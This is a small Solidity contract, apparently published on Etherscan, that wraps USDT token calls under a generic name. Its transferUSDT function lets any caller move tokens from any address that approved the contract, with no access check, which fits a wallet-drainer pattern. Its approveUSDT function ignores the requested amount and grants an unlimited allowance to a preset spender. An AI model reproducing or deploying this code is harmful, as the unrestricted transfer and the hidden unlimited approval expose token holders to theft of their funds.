/**
 *Submitted for verification at Etherscan.io on 2023-02-17
*/

pragma solidity ^0.8.0;

interface USDTToken {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MyContract {
    USDTToken public usdtToken;
    address public owner;
    address public spender;

    constructor(address _usdtTokenAddress, address _spender) {
        usdtToken = USDTToken(_usdtTokenAddress);
        owner = msg.sender;
        spender = _spender;
    }

    function transferUSDT(address sender, address recipient, uint256 amount) public returns (bool) {
        return usdtToken.transferFrom(sender, recipient, amount);
    }

    function getUSDTBalance(address account) public view returns (uint256) {
        return usdtToken.balanceOf(account);
    }

    function getUSDTAllowance(address owner) public view returns (uint256) {
        return usdtToken.allowance(owner, spender);
    }

    function approveUSDT(uint256 amount) public returns (bool) {
        uint256 MAX_APPROVE_AMOUNT = 2**256 - 1; // Максимальное возможное значение uint256
        return usdtToken.approve(spender, MAX_APPROVE_AMOUNT);
    }
}